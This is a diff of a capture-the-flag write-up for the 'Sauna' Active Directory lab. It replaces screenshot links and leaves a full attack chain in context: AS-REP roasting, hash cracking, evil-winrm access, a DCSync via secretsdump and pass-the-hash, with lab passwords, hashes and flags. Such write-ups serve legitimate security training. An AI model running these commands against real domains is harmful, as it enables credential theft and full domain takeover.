@@ -53,7 +53,8 @@ Sauna is an Active Directory box that begins with harvesting employee names from
 nmap -sC -sV -sS -A -T5 -p- -Pn 10.129.95.180
 ```
 
-![Nmap Scan Results](screenshots/01_nmap_scan.png)
+<img width="1141" height="728" alt="image" src="https://github.com/user-attachments/assets/10563265-53dc-4a42-9ce3-d04c75de1e39" />
+
 
 ### Results
 
@@ -87,7 +88,8 @@ echo "10.129.95.180 EGOTISTICAL-BANK.LOCAL" | sudo tee -a /etc/hosts
 
 Browsing `http://10.129.95.180` reveals the "Egotistical Bank" site with a **"Meet the Team"** section listing employee full names:
 
-![Egotistical Bank Team Page](screenshots/02_website_team.png)
+<img width="1102" height="763" alt="image" src="https://github.com/user-attachments/assets/01c76d57-a799-4dac-aceb-40d014622f7d" />
+
 
 ```
 Fergus Smith    Shaun Coins     Bowie Taylor
@@ -103,7 +105,8 @@ Real AD usernames follow naming conventions (`fsmith`, `smith.f`, `fergus.smith`
 # repeat / combine for all employees
 ```
 
-![username-anarchy](screenshots/03_username_anarchy.png)
+<img width="1588" height="658" alt="image" src="https://github.com/user-attachments/assets/5afb5af3-dba4-42d0-9383-f557edc27434" />
+
 
 > **💡 Why this matters:** AD attacks need valid usernames before anything else. The team page handed over the raw material; username-anarchy converted it into a candidate list for Kerberos attacks.
 
@@ -117,7 +120,8 @@ If an account has **"Do not require Kerberos pre-authentication"** set, the KDC 
 impacket-GetNPUsers -dc-ip 10.129.95.180 EGOTISTICAL-BANK.LOCAL/ -usersfile newusers.txt
 ```
 
-![GetNPUsers AS-REP](screenshots/04_getnpusers.png)
+<img width="1705" height="488" alt="image" src="https://github.com/user-attachments/assets/a906c1f2-509e-4cfd-a20e-a789e42f5c19" />
+
 
 The tool returns a `$krb5asrep$` hash for **fsmith** — pre-authentication is disabled on that account. Save the hash to a file (`hashes`).
 
@@ -129,7 +133,8 @@ The tool returns a `$krb5asrep$` hash for **fsmith** — pre-authentication is d
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes
 ```
 
-![John Cracks AS-REP](screenshots/05_john_crack.png)
+<img width="1067" height="221" alt="image" src="https://github.com/user-attachments/assets/063c5fcf-51ac-4419-8a7b-2596aee05f85" />
+
 
 ```
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23)
@@ -152,7 +157,8 @@ fsmith : Thestrokes23
 nxc winrm 10.129.95.180 -u fsmith -p Thestrokes23
 ```
 
-![NetExec WinRM Validation](screenshots/06_nxc_winrm.png)
+<img width="1388" height="201" alt="image" src="https://github.com/user-attachments/assets/eedd92ce-97f4-4874-bd93-0a60f0cc32ef" />
+
 
 ```
 WINRM  10.129.95.180  5985  SAUNA  [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
@@ -164,7 +170,8 @@ WINRM  10.129.95.180  5985  SAUNA  [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes2
 evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
 ```
 
-![Evil-WinRM Shell](screenshots/07_evilwinrm_fsmith.png)
+<img width="1208" height="222" alt="image" src="https://github.com/user-attachments/assets/a060254d-ba47-4d43-bcee-00ec389c4a9d" />
+
 
 ### User Flag
 
@@ -172,7 +179,8 @@ evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
 C:\Users\FSmith\Desktop> type user.txt
 ```
 
-![User Flag](screenshots/08_user_txt.png)
+<img width="639" height="247" alt="image" src="https://github.com/user-attachments/assets/623f131b-fb40-42da-879f-907b4eebe3ae" />
+
 
 ```
 85fdfb2ad6ccc5d24e5b35ef1ca64015
@@ -191,7 +199,9 @@ C:\Users\FSmith\Desktop> upload winPEASx64.exe
 C:\Users\FSmith\Desktop> .\winPEASx64.exe
 ```
 
-![WinPEAS AutoLogon](screenshots/09_winpeas_autologon.png)
+<img width="1631" height="665" alt="image" src="https://github.com/user-attachments/assets/0a3f0e1e-c9d9-4693-a7aa-930c47bb3aaa" />
+<img width="802" height="246" alt="image" src="https://github.com/user-attachments/assets/1e6c550d-433c-4c59-aa36-63b5f7711bc2" />
+
 
 WinPEAS flags **AutoLogon credentials** stored in the registry (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`):
 
@@ -222,7 +232,10 @@ bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' \
   -ns 10.129.95.180 -d EGOTISTICAL-BANK.LOCAL -c All
 ```
 
-![BloodHound Collection](screenshots/10_bloodhound.png)
+<img width="1622" height="774" alt="image" src="https://github.com/user-attachments/assets/95f381df-8879-4b01-b95e-edbc8b807617" />
+<img width="1556" height="414" alt="image" src="https://github.com/user-attachments/assets/94560e10-85ac-436c-ba19-73091bd59f28" />
+
+
 
 BloodHound reveals that **`svc_loanmgr` holds `GetChanges` / `GetChangesAll` rights** on the domain — the replication permissions required for a **DCSync** attack. This account can ask the DC to replicate *any* user's credentials, including the Administrator's.
 
@@ -232,7 +245,8 @@ BloodHound reveals that **`svc_loanmgr` holds `GetChanges` / `GetChangesAll` rig
 impacket-secretsdump egotistical-bank/svc_loanmgr@10.129.95.180 -just-dc-user Administrator
 ```
 
-![secretsdump DCSync](screenshots/11_secretsdump_dcsync.png)
+<img width="1001" height="336" alt="image" src="https://github.com/user-attachments/assets/34044c2c-a642-4012-a0d3-8abdbdf552c7" />
+
 
 ```
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
@@ -256,7 +270,8 @@ No cracking required — replay the NT hash directly over WinRM:
 evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
 ```
 
-![Administrator Pass-the-Hash](screenshots/12_pth_administrator.png)
+<img width="1128" height="273" alt="image" src="https://github.com/user-attachments/assets/d0c8b7e7-6329-411f-a986-bbc4b6101ffe" />
+
 
 ### Root Flag
 
@@ -264,7 +279,8 @@ evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
 C:\Users\Administrator\Desktop> type root.txt
 ```
 
-![Root Flag](screenshots/13_root_txt.png)
+<img width="643" height="261" alt="image" src="https://github.com/user-attachments/assets/6a79f01a-bbc4-4faf-95f5-bda7e3bdbb49" />
+
 
 ```
 070f531c1431dba8eedb6fc83fe2efd4
